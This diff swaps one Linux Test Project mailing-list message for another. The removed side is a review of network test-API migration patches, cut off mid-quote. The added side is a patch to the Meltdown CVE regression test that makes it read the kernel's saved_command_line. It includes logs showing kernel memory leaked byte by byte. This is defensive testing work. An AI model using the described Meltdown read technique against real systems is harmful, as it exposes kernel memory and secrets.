@@ -1,1687 +1,219 @@
-From: Alexey Kodanev <alexey.kodanev@oracle.com>
-Date: Wed, 20 Jun 2018 14:31:02 +0300
-Subject: [LTP] [PATCH 6/6] net/{stress,
- virt}: Migrate tests using virt_lib.sh and ipsec_lib.sh
-In-Reply-To: <20180618173707.30351-7-pvorel@suse.cz>
-References: <20180618173707.30351-1-pvorel@suse.cz>
- <20180618173707.30351-7-pvorel@suse.cz>
-Message-ID: <1c6ef1f5-eb0f-f691-e172-4bb88137745e@oracle.com>
+From: Jan Stancek <jstancek@redhat.com>
+Date: Wed, 20 Jun 2018 13:51:58 +0200
+Subject: [LTP] [PATCH] cve/meltdown: read *saved_command_line
+Message-ID: <761d2d176c0765f3913e140191ceaf83aa745424.1529495077.git.jstancek@redhat.com>
 List-Id: <ltp.lists.linux.it>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 To: ltp@lists.linux.it
 
-On 18.06.2018 20:37, Petr Vorel wrote:
-> + these libraries itself.
-> 
-> It was needed to migrate it all in once, as macsec0{1,2}.sh tests are
-> using both libraries.
-> 
-> This includes:
-> * Create setup, getopts and helper function for both libraries.
-> * Using TST_TEST_DATA and TST_TEST_DATA_IFS in many test cases
-> (simplify tests and allow to have more TST_CNT to keep readability of
-> output + required by udp_ipsec.sh and udp_ipsec_vti.sh otherwise it'd
-> need to use getopts to determine type of udp, as passing parameter to
-> tst_run is not not recommended to new API).
-> * Put code into TST_TESTFUNC functions.
-> * Move anything based on TST_IPV6 to TST_SETUP setup functions (as
-> TST_IPV6 is not set until setup)
-> 
-> Other changes:
-> * udp_ipsec{,_vti}.sh: were calling do_test() twice, with parameter.
-> Now they use correctly TST_CNT and no params.
-> Order of running tests changed. Before first were run udp tests for all
-> items in $IPSEC_SIZE_ARRAY, then all udp_lite tests. Now for each item
-> in $IPSEC_SIZE_ARRAY both udp and udp_lite tests are run.
-> * gre01.sh: Move back device type setting (changed in 57738337a
-> "network/gre01: fix device type setting").
-> 
+After commit 8c06c7740d19 ("x86/pti: Leave kernel text global for !PCID"),
+kernel can now map all of kernel text into the user page tables.
+So, read of "linux_proc_banner" can succeed and report a false positive.
 
-Hi Petr,
+This patch changes the test to read value of "saved_command_line"
+pointer and then also memory pointed to by it. And compares result
+(first 32 bytes) to /proc/cmdline. saved_command_line string is
+allocated dynamically and falls outside of (_text, _end) area:
+  crash> p/x _text
+  $2 = 0xffffffff81000000 <startup_64>
+  crash> p/x _end
+  $3 = 0xffffffff82411000
+  crash> p/x &saved_command_line
+  $4 = 0xffffffff81cf3008
+  crash> p/x saved_command_line
+  $5 = 0xffff88007ff55100
+so test should work on kernels with and without the patch.
 
-Thanks for the patches, good work! Some comments below.
+Signed-off-by: Jan Stancek <jstancek@redhat.com>
+---
+ testcases/cve/meltdown.c | 64 ++++++++++++++++++++++++++++++++++++------------
+ 1 file changed, 48 insertions(+), 16 deletions(-)
 
-> Signed-off-by: Petr Vorel <pvorel@suse.cz>
-> ---
->  testcases/network/stress/dccp/dccp_ipsec.sh   |  19 +--
->  .../network/stress/dccp/dccp_ipsec_vti.sh     |  19 +--
->  .../network/stress/icmp/icmp-uni-basic.sh     |  26 +--
->  testcases/network/stress/icmp/icmp-uni-vti.sh |  24 +--
->  testcases/network/stress/ipsec/ipsec_lib.sh   | 141 ++++++++--------
->  testcases/network/stress/sctp/sctp_ipsec.sh   |  20 +--
->  .../network/stress/sctp/sctp_ipsec_vti.sh     |  20 +--
->  testcases/network/stress/tcp/tcp_ipsec.sh     |  22 +--
->  testcases/network/stress/tcp/tcp_ipsec_vti.sh |  21 +--
->  testcases/network/stress/udp/udp_ipsec.sh     |  24 ++-
->  testcases/network/stress/udp/udp_ipsec_vti.sh |  24 ++-
->  testcases/network/virt/geneve01.sh            |  42 ++---
->  testcases/network/virt/gre01.sh               |  34 ++--
->  testcases/network/virt/ipvlan01.sh            |  12 +-
->  testcases/network/virt/macsec01.sh            |  30 ++--
->  testcases/network/virt/macsec02.sh            |  32 ++--
->  testcases/network/virt/macvlan01.sh           |  17 +-
->  testcases/network/virt/macvtap01.sh           |  17 +-
->  testcases/network/virt/virt_lib.sh            | 154 +++++++-----------
->  testcases/network/virt/vlan01.sh              |  19 +--
->  testcases/network/virt/vlan02.sh              |  12 +-
->  testcases/network/virt/vlan03.sh              |  50 +++---
->  testcases/network/virt/vxlan01.sh             |  15 +-
->  testcases/network/virt/vxlan02.sh             |  15 +-
->  testcases/network/virt/vxlan03.sh             |  37 +++--
->  25 files changed, 401 insertions(+), 445 deletions(-)
-> 
-> diff --git a/testcases/network/stress/dccp/dccp_ipsec.sh b/testcases/network/stress/dccp/dccp_ipsec.sh
-> index d1afd4569..ef80bf979 100755
-> --- a/testcases/network/stress/dccp/dccp_ipsec.sh
-> +++ b/testcases/network/stress/dccp/dccp_ipsec.sh
-> @@ -1,25 +1,18 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2017 Oracle and/or its affiliates. All Rights Reserved.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  
-> -TCID=dccp_ipsec
-> -TST_TOTAL=3
->  TST_NEEDS_TMPDIR=1
-> -TST_CLEANUP="tst_ipsec_cleanup"
-> -
-> +TST_TESTFUNC=do_test
-> +TST_SETUP=tst_ipsec_setup
-> +TST_CLEANUP=tst_ipsec_cleanup
->  . ipsec_lib.sh
->  
->  do_test()
->  {
-> -	for p in $IPSEC_SIZE_ARRAY; do
-> -		tst_netload -H $(tst_ipaddr rhost) -T dccp -n $p -N $p \
-> -			-r $IPSEC_REQUESTS
-> -	done
-> +	tst_netload -H $(tst_ipaddr rhost) -T dccp -n $2 -N $2 -r $IPSEC_REQUESTS
->  }
->  
-> -tst_ipsec_setup
-> -
-> -do_test
-> -
-> -tst_exit
-> +tst_run
-> diff --git a/testcases/network/stress/dccp/dccp_ipsec_vti.sh b/testcases/network/stress/dccp/dccp_ipsec_vti.sh
-> index f5ff1029d..ee2b0d4ca 100755
-> --- a/testcases/network/stress/dccp/dccp_ipsec_vti.sh
-> +++ b/testcases/network/stress/dccp/dccp_ipsec_vti.sh
-> @@ -1,25 +1,18 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2017 Oracle and/or its affiliates. All Rights Reserved.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  
-> -TCID=dccp_ipsec_vti
-> -TST_TOTAL=3
->  TST_NEEDS_TMPDIR=1
-> -TST_CLEANUP="tst_ipsec_cleanup"
-> -
-> +TST_TESTFUNC=do_test
-> +TST_SETUP=tst_ipsec_setup_vti
-> +TST_CLEANUP=tst_ipsec_cleanup
->  . ipsec_lib.sh
->  
->  do_test()
->  {
-> -	for p in $IPSEC_SIZE_ARRAY; do
-> -		tst_netload -H $ip_rmt_tun -T dccp -n $p -N $p \
-> -			-r $IPSEC_REQUESTS
-> -	done
-> +	tst_netload -H $ip_rmt_tun -T dccp -n $2 -N $2 -r $IPSEC_REQUESTS
->  }
->  
-> -tst_ipsec_setup_vti
-> -
-> -do_test
-> -
-> -tst_exit
-> +tst_run
-> diff --git a/testcases/network/stress/icmp/icmp-uni-basic.sh b/testcases/network/stress/icmp/icmp-uni-basic.sh
-> index b168a821c..5980b81e5 100755
-> --- a/testcases/network/stress/icmp/icmp-uni-basic.sh
-> +++ b/testcases/network/stress/icmp/icmp-uni-basic.sh
-> @@ -1,21 +1,25 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2016 Red Hat Inc.,  All Rights Reserved.
->  # Copyright (c) International Business Machines  Corp., 2005
->  # Author: Hangbin Liu <haliu@redhat.com>
->  
-> -TCID=${TCID:-icmp-uni-basic}
-> -TST_TOTAL=1
-> -TST_COUNT=1
-> -TST_CLEANUP="tst_ipsec_cleanup"
-> -
-> +TST_TESTFUNC=do_test
-> +TST_SETUP=do_setup
-> +TST_CLEANUP=tst_ipsec_cleanup
->  . ipsec_lib.sh
->  
-> -tst_ipsec_setup
-> -
-> -PING_MAX="$IPSEC_REQUESTS"
-> +do_setup()
-> +{
-> +	tst_ipsec_setup
-> +	PING_MAX="$IPSEC_REQUESTS"
-> +	tst_res TINFO "Sending ICMP messages"
-> +}
->  
-> -tst_resm TINFO "Sending ICMP messages"
-> -tst_ping $(tst_iface) $(tst_ipaddr rhost) $IPSEC_SIZE_ARRAY
-> +do_test()
-> +{
-> +	tst_ping $(tst_iface) $(tst_ipaddr rhost) $2
-> +}
->  
-> -tst_exit
-> +tst_run
-> diff --git a/testcases/network/stress/icmp/icmp-uni-vti.sh b/testcases/network/stress/icmp/icmp-uni-vti.sh
-> index 9a7fba59f..24eca177c 100755
-> --- a/testcases/network/stress/icmp/icmp-uni-vti.sh
-> +++ b/testcases/network/stress/icmp/icmp-uni-vti.sh
-> @@ -1,24 +1,24 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2016 Oracle and/or its affiliates. All Rights Reserved.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  
-> -TCID=icmp-uni-vti
-> -TST_TOTAL=1
-> -TST_CLEANUP="tst_ipsec_cleanup"
-> -
-> +TST_TESTFUNC=do_test
-> +TST_SETUP=do_setup
-> +TST_CLEANUP=tst_ipsec_cleanup
->  . ipsec_lib.sh
->  
-> -do_test()
-> +do_setup()
->  {
-> +	tst_ipsec_setup_vti
->  	PING_MAX="$IPSEC_REQUESTS"
-> -
-> -	tst_resm TINFO "Sending ICMP messages"
-> -	tst_ping $tst_vti $ip_rmt_tun $IPSEC_SIZE_ARRAY
-> +	tst_res TINFO "Sending ICMP messages"
->  }
->  
-> -tst_ipsec_setup_vti
-> -
-> -do_test
-> +do_test()
-> +{
-> +	tst_ping $tst_vti $ip_rmt_tun $2
-> +}
->  
-> -tst_exit
-> +tst_run
-> diff --git a/testcases/network/stress/ipsec/ipsec_lib.sh b/testcases/network/stress/ipsec/ipsec_lib.sh
-> index e851d46e4..6112862ae 100644
-> --- a/testcases/network/stress/ipsec/ipsec_lib.sh
-> +++ b/testcases/network/stress/ipsec/ipsec_lib.sh
-> @@ -17,26 +17,24 @@ CALGO="deflate"
->  IPSEC_REQUESTS="500"
->  IPSEC_SIZE_ARRAY="${IPSEC_SIZE_ARRAY:-10:100:1000:2000:10000:65000}"
->  
-> +ipsec_lib_usage()
-> +{
-> +	echo "l n     n is the number of test link when tests run"
-> +	echo "m x     x is ipsec mode, could be transport / tunnel"
-> +	echo "p x     x is ipsec protocol, could be ah / esp / comp"
-> +	echo "s x     x is icmp message size array"
-> +	echo "S n     n is IPsec SPI value"
-> +	echo "k x     key for vti interface"
-> +	echo "A x     Authenticated encryption with associated data algorithm"
-> +	echo "e x     Encryption algorithm"
-> +	echo "a x     Authentication algorithm"
-> +	echo "c x     Compression algorithm"
-> +	echo "r x     Num of requests, PING_MAX or netstress' '-r' opt"
-> +}
-> +
->  ipsec_lib_parse_args()
->  {
->  	case "$1" in
-> -	h)
-> -		echo "Usage:"
-> -		echo "h        help"
-> -		echo "l n      n is the number of test link when tests run"
-> -		echo "m x      x is ipsec mode, could be transport / tunnel"
-> -		echo "p x      x is ipsec protocol, could be ah / esp / comp"
-> -		echo "s x      x is icmp message size array (items separated by ':')"
-> -		echo "S n      n is IPsec SPI value"
-> -		echo "k x      key for vti interface"
-> -		echo "A x      Authenticated encryption with associated data algorithm"
-> -		echo "e x      Encryption algorithm"
-> -		echo "a x      Authentication algorithm"
-> -		echo "c x      Compression algorithm"
-> -		echo "r x      Num of requests, PING_MAX or netstress' '-r' opt"
-> -		echo "6        run over IPv6"
-> -		exit 0
-> -	;;
->  	l) LINK_NUM=$2 ;;
->  	m) IPSEC_MODE=$2 ;;
->  	p) IPSEC_PROTO=$2 ;;
-> @@ -48,21 +46,53 @@ ipsec_lib_parse_args()
->  	a) AALGO=$2 ;;
->  	c) CALGO=$2 ;;
->  	r) IPSEC_REQUESTS="$2" ;;
-> -	*) tst_brkm TBROK "unknown option: $1" ;;
->  	esac
-> +}
-> +
-> +ipsec_lib_setup()
-> +{
-> +	case $AEALGO in
-> +	rfc4106_128|rfc4543_128) AEALGO_KEY=$(get_key 160) ;;
-> +	rfc4106_192|rfc4543_192) AEALGO_KEY=$(get_key 224) ;;
-> +	rfc4106_256|rfc4543_256) AEALGO_KEY=$(get_key 288) ;;
-> +	rfc4309_128) AEALGO_KEY=$(get_key 152) ;;
-> +	rfc4309_192) AEALGO_KEY=$(get_key 216) ;;
-> +	rfc4309_256) AEALGO_KEY=$(get_key 280) ;;
-> +	esac
-> +
-> +	case $EALGO in
-> +	des) EALGO_KEY=$(get_key 64) ;;
-> +	des3_ede) EALGO_KEY=$(get_key 192) ;;
-> +	cast5) EALGO_KEY=$(get_key 128) ;;
-> +	blowfish) EALGO_KEY=$(get_key 448) ;;
-> +	aes|twofish|camellia|serpent) EALGO_KEY=$(get_key 256) ;;
-> +	*) tst_brk TBROK "unknown enc alg: $EALGO" ;;
-> +	esac
-> +
-> +	case $AALGO in
-> +	sha1|rmd160) AALGO_KEY=$(get_key 160) ;;
-> +	sha256) AALGO_KEY=$(get_key 256) ;;
-> +	sha384) AALGO_KEY=$(get_key 384) ;;
-> +	sha512) AALGO_KEY=$(get_key 512) ;;
-> +	*) tst_brk TBROK "unknown auth alg: $AALGO" ;;
-> +	esac
-> +
-> +	SPI=${SPI:-1000}
-> +	VTI_KEY=${VTI_KEY:-10}
-> +	cleanup_vti=
-> +	ALG=
-> +	ALGR=
->  
-> -	local IFS=":"
-> -	local tmp="$IPSEC_SIZE_ARRAY"
-> -	local p
-> -	for p in $IPSEC_SIZE_ARRAY; do
-> -		tmp="$p "
-> -	done
-> -	IPSEC_SIZE_ARRAY="$tmp"
-> +	if [ -z "$IPSEC_LIB_IGNORE_IPSEC_SIZE_ARRAY" ]; then
-> +		TST_TEST_DATA_IFS=":"
-> +		TST_TEST_DATA="$IPSEC_SIZE_ARRAY"
-> +	fi
+1. older kernel: 3.10.0-693.el7.x86_64
+# ./meltdown 
+tst_test.c:1015: INFO: Timeout per run is 0h 05m 00s
+meltdown.c:259: INFO: access time: cached = 61, uncached = 501, threshold = 174
+meltdown.c:309: INFO: &saved_command_line == 0xffffffff81cf3008
+meltdown.c:342: INFO: read ffffffff81cf3008 = 0x00  
+meltdown.c:342: INFO: read ffffffff81cf3009 = 0x51 Q
+meltdown.c:342: INFO: read ffffffff81cf300a = 0xf5  
+meltdown.c:342: INFO: read ffffffff81cf300b = 0x7f  
+meltdown.c:342: INFO: read ffffffff81cf300c = 0x00  
+meltdown.c:342: INFO: read ffffffff81cf300d = 0x88  
+meltdown.c:342: INFO: read ffffffff81cf300e = 0xff  
+meltdown.c:342: INFO: read ffffffff81cf300f = 0xff  
+meltdown.c:350: INFO: save_command_line: 0xffff88007ff55100
+meltdown.c:362: INFO: read ffff88007ff55100 = 0x42 B | expected 0x42 | match: 1
+meltdown.c:362: INFO: read ffff88007ff55101 = 0x4f O | expected 0x4f | match: 1
+meltdown.c:362: INFO: read ffff88007ff55102 = 0x4f O | expected 0x4f | match: 1
+meltdown.c:362: INFO: read ffff88007ff55103 = 0x54 T | expected 0x54 | match: 1
+meltdown.c:362: INFO: read ffff88007ff55104 = 0x5f _ | expected 0x5f | match: 1
+meltdown.c:362: INFO: read ffff88007ff55105 = 0x49 I | expected 0x49 | match: 1
+meltdown.c:362: INFO: read ffff88007ff55106 = 0x4d M | expected 0x4d | match: 1
+meltdown.c:362: INFO: read ffff88007ff55107 = 0x41 A | expected 0x41 | match: 1
+meltdown.c:362: INFO: read ffff88007ff55108 = 0x47 G | expected 0x47 | match: 1
+meltdown.c:362: INFO: read ffff88007ff55109 = 0x45 E | expected 0x45 | match: 1
+meltdown.c:362: INFO: read ffff88007ff5510a = 0x3d = | expected 0x3d | match: 1
+meltdown.c:362: INFO: read ffff88007ff5510b = 0x2f / | expected 0x2f | match: 1
+meltdown.c:362: INFO: read ffff88007ff5510c = 0x76 v | expected 0x76 | match: 1
+meltdown.c:362: INFO: read ffff88007ff5510d = 0x6d m | expected 0x6d | match: 1
+meltdown.c:362: INFO: read ffff88007ff5510e = 0x6c l | expected 0x6c | match: 1
+meltdown.c:362: INFO: read ffff88007ff5510f = 0x69 i | expected 0x69 | match: 1
+meltdown.c:362: INFO: read ffff88007ff55110 = 0x6e n | expected 0x6e | match: 1
+meltdown.c:362: INFO: read ffff88007ff55111 = 0x75 u | expected 0x75 | match: 1
+meltdown.c:362: INFO: read ffff88007ff55112 = 0x7a z | expected 0x7a | match: 1
+meltdown.c:362: INFO: read ffff88007ff55113 = 0x2d - | expected 0x2d | match: 1
+meltdown.c:362: INFO: read ffff88007ff55114 = 0x33 3 | expected 0x33 | match: 1
+meltdown.c:362: INFO: read ffff88007ff55115 = 0x2e . | expected 0x2e | match: 1
+meltdown.c:362: INFO: read ffff88007ff55116 = 0x31 1 | expected 0x31 | match: 1
+meltdown.c:362: INFO: read ffff88007ff55117 = 0x30 0 | expected 0x30 | match: 1
+meltdown.c:362: INFO: read ffff88007ff55118 = 0x2e . | expected 0x2e | match: 1
+meltdown.c:362: INFO: read ffff88007ff55119 = 0x30 0 | expected 0x30 | match: 1
+meltdown.c:362: INFO: read ffff88007ff5511a = 0x2d - | expected 0x2d | match: 1
+meltdown.c:362: INFO: read ffff88007ff5511b = 0x36 6 | expected 0x36 | match: 1
+meltdown.c:362: INFO: read ffff88007ff5511c = 0x39 9 | expected 0x39 | match: 1
+meltdown.c:362: INFO: read ffff88007ff5511d = 0x33 3 | expected 0x33 | match: 1
+meltdown.c:362: INFO: read ffff88007ff5511e = 0x2e . | expected 0x2e | match: 1
+meltdown.c:362: INFO: read ffff88007ff5511f = 0x65 e | expected 0x65 | match: 1
+meltdown.c:373: FAIL: I was able to read your kernel memory!!!
+meltdown.c:376: INFO: score(matched/all): 32 / 32
 
-Could we pass "-s" parameters to TST_TEST_DATA directly? So that we don't
-need the workaround with "IPSEC_LIB_IGNORE_IPSEC_SIZE_ARRAY"... it seems
-"-s" is always set for IPsec tests.
+2. recent upstream kernel: 4.17+
+# ./meltdown 
+tst_test.c:1015: INFO: Timeout per run is 0h 05m 00s
+meltdown.c:259: INFO: access time: cached = 49, uncached = 332, threshold = 127
+meltdown.c:309: INFO: &saved_command_line == 0xffffffffaa993008
+meltdown.c:342: INFO: read ffffffffaa993008 = 0x00  
+meltdown.c:342: INFO: read ffffffffaa993009 = 0x00  
+meltdown.c:342: INFO: read ffffffffaa99300a = 0x00  
+meltdown.c:342: INFO: read ffffffffaa99300b = 0x00  
+meltdown.c:342: INFO: read ffffffffaa99300c = 0x00  
+meltdown.c:342: INFO: read ffffffffaa99300d = 0x00  
+meltdown.c:342: INFO: read ffffffffaa99300e = 0x00  
+meltdown.c:342: INFO: read ffffffffaa99300f = 0x00  
+meltdown.c:350: INFO: save_command_line: 0x0
+meltdown.c:375: PASS: I was not able to read your kernel memory
+meltdown.c:376: INFO: score(matched/all): 0 / 32
 
 
->  }
->  
-> -TST_OPTS="hl:m:p:s:S:k:A:e:a:c:r:"
-> +TST_OPTS="l:m:p:s:S:k:A:e:a:c:r:"
->  TST_PARSE_ARGS=ipsec_lib_parse_args
-> -TST_USE_LEGACY_API=1
-> +TST_SETUP=${TST_SETUP:-ipsec_lib_setup}
-> +TST_USAGE=ipsec_lib_usage
->  . tst_net.sh
->  
->  get_key()
-> @@ -72,43 +102,12 @@ get_key()
->  	echo "0x$(hexdump -vn $bytes -e '1/1 "%02x"' /dev/urandom)"
->  }
->  
-> -case $AEALGO in
-> -rfc4106_128|rfc4543_128) AEALGO_KEY=$(get_key 160) ;;
-> -rfc4106_192|rfc4543_192) AEALGO_KEY=$(get_key 224) ;;
-> -rfc4106_256|rfc4543_256) AEALGO_KEY=$(get_key 288) ;;
-> -rfc4309_128) AEALGO_KEY=$(get_key 152) ;;
-> -rfc4309_192) AEALGO_KEY=$(get_key 216) ;;
-> -rfc4309_256) AEALGO_KEY=$(get_key 280) ;;
-> -esac
-> -
-> -case $EALGO in
-> -des) EALGO_KEY=$(get_key 64) ;;
-> -des3_ede) EALGO_KEY=$(get_key 192) ;;
-> -cast5) EALGO_KEY=$(get_key 128) ;;
-> -blowfish) EALGO_KEY=$(get_key 448) ;;
-> -aes|twofish|camellia|serpent) EALGO_KEY=$(get_key 256) ;;
-> -*) tst_brkm TBROK "unknown enc alg: $EALGO" ;;
-> -esac
-> -
-> -case $AALGO in
-> -sha1|rmd160) AALGO_KEY=$(get_key 160) ;;
-> -sha256) AALGO_KEY=$(get_key 256) ;;
-> -sha384) AALGO_KEY=$(get_key 384) ;;
-> -sha512) AALGO_KEY=$(get_key 512) ;;
-> -*) tst_brkm TBROK "unknown auth alg: $AALGO" ;;
-> -esac
-> -
-> -SPI=${SPI:-1000}
-> -VTI_KEY=${VTI_KEY:-10}
-> -cleanup_vti=
-> -ALG=
-> -ALGR=
-> -
->  tst_ipsec_setup()
->  {
-> +	ipsec_lib_setup
->  	# Configure SAD/SPD
->  	if [ -n "$IPSEC_MODE" -a -n "$IPSEC_PROTO" ]; then
-> -		tst_resm TINFO "IPsec[$IPSEC_PROTO/$IPSEC_MODE]"
-> +		tst_res TINFO "IPsec[$IPSEC_PROTO/$IPSEC_MODE]"
->  		tst_ipsec lhost $(tst_ipaddr) $(tst_ipaddr rhost)
->  		tst_ipsec rhost $(tst_ipaddr rhost) $(tst_ipaddr)
->  	fi
-> @@ -125,8 +124,6 @@ tst_ipsec_cleanup()
->  		ip li del $cleanup_vti 2>/dev/null
->  		tst_rhost_run -c "ip li del $cleanup_vti 2>/dev/null"
->  	fi
-> -
-> -	[ "$TST_NEEDS_TMPDIR" = 1 ] && tst_rmdir
->  }
->  
->  ipsec_set_algoline()
-> @@ -161,7 +158,7 @@ ipsec_set_algoline()
->  		ALGR=$ALG
->  		;;
->  	*)
-> -		tst_brkm TCONF "tst_ipsec protocol mismatch"
-> +		tst_brk TCONF "tst_ipsec protocol mismatch"
->  		;;
->  	esac
->  }
-> @@ -173,11 +170,11 @@ ipsec_try()
->  	if echo "$output" | grep -q "TERR"; then
->  		echo "$output" | grep -q \
->  			'RTNETLINK answers: Function not implemented' && \
-> -			tst_brkm TCONF "'$@': not implemented"
-> +			tst_brk TCONF "'$@': not implemented"
->  		echo "$output" | grep -q \
->  			'RTNETLINK answers: Operation not supported' && \
-> -			tst_brkm TCONF "'$@': not supported (maybe missing 'ip${TST_IPV6}_vti' kernel module)"
-> -		tst_brkm TBROK "$@ failed: $output"
-> +			tst_brk TCONF "'$@': not supported (maybe missing 'ip${TST_IPV6}_vti' kernel module)"
-> +		tst_brk TBROK "$@ failed: $output"
->  	fi
->  }
->  
-> @@ -189,7 +186,7 @@ ipsec_try()
->  tst_ipsec()
->  {
->  	if [ $# -ne 3 ]; then
-> -		tst_brkm TCONF "tst_ipsec parameter mismatch"
-> +		tst_brk TCONF "tst_ipsec parameter mismatch"
->  	fi
->  
->  	local target=$1
-> @@ -237,7 +234,7 @@ tst_ipsec()
->  tst_ipsec_vti()
->  {
->  	if [ $# -ne 4 ]; then
-> -		tst_brkm TCONF "tst_ipsec_vti parameter mismatch"
-> +		tst_brk TCONF "tst_ipsec_vti parameter mismatch"
->  	fi
->  
->  	local target=$1
-> @@ -255,7 +252,7 @@ tst_ipsec_vti()
->  	local rd="dev $(tst_iface rhost)"
->  
->  	ip li add type vti help 2>&1 | grep -q vti || \
-> -		tst_brkm TCONF "iproute doesn't support 'vti'"
-> +		tst_brk TCONF "iproute doesn't support 'vti'"
->  
->  	ipsec_set_algoline
->  
-> @@ -296,6 +293,8 @@ tst_ipsec_vti()
->  #  * ip_rmt_tun - remote IP address
->  tst_ipsec_setup_vti()
->  {
-> +	ipsec_lib_setup
-> +
->  	if_loc=$(tst_iface)
->  	if_rmt=$(tst_iface rhost)
->  
-> @@ -304,7 +303,7 @@ tst_ipsec_setup_vti()
->  
->  	tst_vti="ltp_vti0"
->  
-> -	tst_resm TINFO "Test vti$TST_IPV6 + IPsec[$IPSEC_PROTO/$IPSEC_MODE]"
-> +	tst_res TINFO "Test vti$TST_IPV6 + IPsec[$IPSEC_PROTO/$IPSEC_MODE]"
->  
->  	tst_ipsec_vti lhost $ip_loc $ip_rmt $tst_vti
->  	tst_ipsec_vti rhost $ip_rmt $ip_loc $tst_vti
-> @@ -322,7 +321,7 @@ tst_ipsec_setup_vti()
->  		ROD ip route add ${IPV4_NET16_UNUSED}.1.0/$mask dev $tst_vti
->  	fi
->  
-> -	tst_resm TINFO "Add IPs to vti tunnel, " \
-> +	tst_res TINFO "Add IPs to vti tunnel, " \
->  		       "loc: $ip_loc_tun/$mask, rmt: $ip_rmt_tun/$mask"
->  
->  	ROD ip a add $ip_loc_tun/$mask dev $tst_vti nodad
-> diff --git a/testcases/network/stress/sctp/sctp_ipsec.sh b/testcases/network/stress/sctp/sctp_ipsec.sh
-> index ee9018f01..8a7b885d9 100755
-> --- a/testcases/network/stress/sctp/sctp_ipsec.sh
-> +++ b/testcases/network/stress/sctp/sctp_ipsec.sh
-> @@ -1,25 +1,19 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2017 Oracle and/or its affiliates. All Rights Reserved.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  
-> -TCID=sctp_ipsec
-> -TST_TOTAL=3
->  TST_NEEDS_TMPDIR=1
-> -TST_CLEANUP="tst_ipsec_cleanup"
-> -
-> +TST_TESTFUNC=do_test
-> +TST_SETUP=tst_ipsec_setup
-> +TST_CLEANUP=tst_ipsec_cleanup
->  . ipsec_lib.sh
->  
->  do_test()
->  {
-> -	for p in $IPSEC_SIZE_ARRAY; do
-> -		tst_netload -H $(tst_ipaddr rhost) -T sctp -n $p -N $p \
-> -			-r $IPSEC_REQUESTS -S $(tst_ipaddr)
-> -	done
-> +	tst_netload -H $(tst_ipaddr rhost) -T sctp -n $2 -N $2 \
-> +		-r $IPSEC_REQUESTS -S $(tst_ipaddr)
->  }
->  
-> -tst_ipsec_setup
-> -
-> -do_test
-> -
-> -tst_exit
-> +tst_run
-> diff --git a/testcases/network/stress/sctp/sctp_ipsec_vti.sh b/testcases/network/stress/sctp/sctp_ipsec_vti.sh
-> index ed851475a..d0f24c727 100755
-> --- a/testcases/network/stress/sctp/sctp_ipsec_vti.sh
-> +++ b/testcases/network/stress/sctp/sctp_ipsec_vti.sh
-> @@ -1,25 +1,19 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2017 Oracle and/or its affiliates. All Rights Reserved.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  
-> -TCID=sctp_ipsec_vti
-> -TST_TOTAL=3
->  TST_NEEDS_TMPDIR=1
-> -TST_CLEANUP="tst_ipsec_cleanup"
-> -
-> +TST_SETUP=tst_ipsec_setup_vti
-> +TST_CLEANUP=tst_ipsec_cleanup
-> +TST_TESTFUNC=do_test
->  . ipsec_lib.sh
->  
->  do_test()
->  {
-> -	for p in $IPSEC_SIZE_ARRAY; do
-> -		tst_netload -H $ip_rmt_tun -T sctp -n $p -N $p \
-> -			-r $IPSEC_REQUESTS -S $ip_loc_tun
-> -	done
-> +	tst_netload -H $ip_rmt_tun -T sctp -n $2 -N $2 -r $IPSEC_REQUESTS \
-> +		-S $ip_loc_tun
->  }
->  
-> -tst_ipsec_setup_vti
-> -
-> -do_test
-> -
-> -tst_exit
-> +tst_run
-> diff --git a/testcases/network/stress/tcp/tcp_ipsec.sh b/testcases/network/stress/tcp/tcp_ipsec.sh
-> index 0f875948c..d62272db0 100755
-> --- a/testcases/network/stress/tcp/tcp_ipsec.sh
-> +++ b/testcases/network/stress/tcp/tcp_ipsec.sh
-> @@ -1,27 +1,21 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2017 Oracle and/or its affiliates. All Rights Reserved.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  
-> -TCID=tcp_ipsec
-> -TST_TOTAL=3
->  TST_NEEDS_TMPDIR=1
-> -TST_CLEANUP="tst_ipsec_cleanup"
-> +TST_TESTFUNC=do_test
-> +TST_SETUP=tst_ipsec_setup
-> +TST_CLEANUP=tst_ipsec_cleanup
-> +. ipsec_lib.sh
->  
->  max_requests=10
->  
-> -. ipsec_lib.sh
-> -
->  do_test()
->  {
-> -	for p in $IPSEC_SIZE_ARRAY; do
-> -		tst_netload -H $(tst_ipaddr rhost) -n $p -N $p \
-> -			-r $IPSEC_REQUESTS -R $max_requests
-> -	done
-> +	tst_netload -H $(tst_ipaddr rhost) -n $2 -N $2 -r $IPSEC_REQUESTS \
-> +		-R $max_requests
->  }
->  
-> -tst_ipsec_setup
-> -
-> -do_test
-> -
-> -tst_exit
-> +tst_run
-> diff --git a/testcases/network/stress/tcp/tcp_ipsec_vti.sh b/testcases/network/stress/tcp/tcp_ipsec_vti.sh
-> index 13a67d3bb..f7bbbc6e9 100755
-> --- a/testcases/network/stress/tcp/tcp_ipsec_vti.sh
